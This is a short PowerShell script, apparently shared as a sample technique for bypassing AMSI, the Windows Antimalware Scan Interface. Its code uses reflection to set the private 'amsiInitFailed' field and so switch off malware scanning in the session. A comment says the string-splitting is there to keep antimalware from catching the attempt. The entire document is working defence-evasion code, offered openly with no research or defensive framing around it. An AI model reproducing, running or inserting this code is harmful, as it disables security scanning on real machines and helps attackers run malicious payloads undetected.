# Sample AMSI bypass technique
# Splitting strings to avoid the antimalware catching the attempt to attack

$a = 'System.Management.Automation.A';$b = 'msiUtils'
$c = [Ref].Assembly.GetType($a+$b)
$d = $c.GetField('amsiInitFailed','NonPublic,Static')
$d.SetValue($null,$true)
